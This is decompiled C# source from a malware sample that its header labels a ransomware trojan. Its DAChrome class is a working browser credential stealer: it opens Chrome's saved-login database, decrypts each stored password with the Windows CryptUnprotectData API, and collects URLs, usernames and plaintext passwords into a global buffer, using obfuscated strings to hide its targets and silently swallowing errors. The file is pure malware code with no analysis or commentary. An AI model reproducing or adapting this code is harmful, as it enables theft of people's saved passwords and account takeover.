// Decompiled with JetBrains decompiler
// Type: DAChrome
// Assembly: new2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7D97D205-93EA-4722-A1E5-21E77DE843A1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-30a4eb8393f203db2dc365b910e352cfc02ba6f80a0ccd316800296661747606.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public class DAChrome
{
  public static string cPass;

  public static void GTCHRME()
  {
    string str1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + WOGVCL.TGKKNH("jZPGzbedsbOhuKO7xMOshr+80HB1rcu/rHWxvb/FncCzqr+YtcV+lJLAuBg=", "False");
    try
    {
      SQLiteHandler sqLiteHandler = new SQLiteHandler(str1);
      SQLiteHandler.REDTBLE(WOGVCL.TGKKNH("l7W4wbieHA==", "False"));
      if (!File.Exists(str1))
        return;
      int num = checked (SQLiteHandler.GetRowCount() - 1);
      int row_num = 0;
      while (row_num <= num)
      {
        string str2 = SQLiteHandler.GetValue(row_num, WOGVCL.TGKKNH("jautsqaMmLm9qSg=", "False"));
        string Left1 = SQLiteHandler.GetValue(row_num, WOGVCL.TGKKNH("nre0yLaKsbS1voqwxLsh", "False"));
        string Left2 = DAChrome.Decrypt(Encoding.Default.GetBytes(SQLiteHandler.GetValue(row_num, WOGVCL.TGKKNH("oa3K0cegvru9xpK4zMMZ", "False"))));
        if (Operators.CompareString(Left1, "", false) != 0 & Operators.CompareString(Left2, "", false) != 0)
        {
          DAChrome.cPass = WOGVCL.TGKKNH("gZynrqCBnKeuoIGcrdnVs8zPrqCBnKeuoIGcp66ggZwE", "False") + "\r\n" + WOGVCL.TGKKNH("fL7N1Y1UEw==", "False") + str2 + "\r\n" + WOGVCL.TGKKNH("eLGuwrCEq66KYiM=", "False") + Left1 + "\r\n" + WOGVCL.TGKKNH("eqbDysCZt7SRaRw=", "False") + Left2 + "\r\n" + WOGVCL.TGKKNH("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZQg", "False") + "\r\n ";
          CMFVPTX.YBXCIO += DAChrome.cPass;
        }
        checked { ++row_num; }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  [DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern bool CryptUnprotectData(
    ref DAChrome.DATA_BLOB pDataIn,
    string szDataDescr,
    ref DAChrome.DATA_BLOB pOptionalEntropy,
    IntPtr pvReserved,
    ref DAChrome.CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
    int dwFlags,
    ref DAChrome.DATA_BLOB pDataOut);

  public static string Decrypt(byte[] Datas)
  {
    DAChrome.DATA_BLOB dataBlob1 = new DAChrome.DATA_BLOB();
    DAChrome.DATA_BLOB dataBlob2 = new DAChrome.DATA_BLOB();
    GCHandle gcHandle = GCHandle.Alloc((object) Datas, GCHandleType.Pinned);
    dataBlob1.pbData = gcHandle.AddrOfPinnedObject();
    dataBlob1.cbData = Datas.Length;
    gcHandle.Free();
    ref DAChrome.DATA_BLOB local1 = ref dataBlob1;
    DAChrome.DATA_BLOB dataBlob3;
    DAChrome.DATA_BLOB dataBlob4 = dataBlob3;
    ref DAChrome.DATA_BLOB local2 = ref dataBlob4;
    IntPtr num;
    IntPtr pvReserved = num;
    DAChrome.CRYPTPROTECT_PROMPTSTRUCT cryptprotectPromptstruct1;
    DAChrome.CRYPTPROTECT_PROMPTSTRUCT cryptprotectPromptstruct2 = cryptprotectPromptstruct1;
    ref DAChrome.CRYPTPROTECT_PROMPTSTRUCT local3 = ref cryptprotectPromptstruct2;
    ref DAChrome.DATA_BLOB local4 = ref dataBlob2;
    DAChrome.CryptUnprotectData(ref local1, (string) null, ref local2, pvReserved, ref local3, 0, ref local4);
    byte[] numArray = new byte[checked (dataBlob2.cbData + 1)];
    Marshal.Copy(dataBlob2.pbData, numArray, 0, dataBlob2.cbData);
    string str = Encoding.Default.GetString(numArray);
    return str.Substring(0, checked (str.Length - 1));
  }

  [Flags]
  public enum CryptProtectPromptFlags
  {
    CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
    CRYPTPROTECT_PROMPT_ON_PROTECT = 2,
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  public struct CRYPTPROTECT_PROMPTSTRUCT
  {
    public int cbSize;
    public DAChrome.CryptProtectPromptFlags dwPromptFlags;
    public IntPtr hwndApp;
    public string szPrompt;
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  public struct DATA_BLOB
  {
    public int cbData;
    public IntPtr pbData;
  }
}
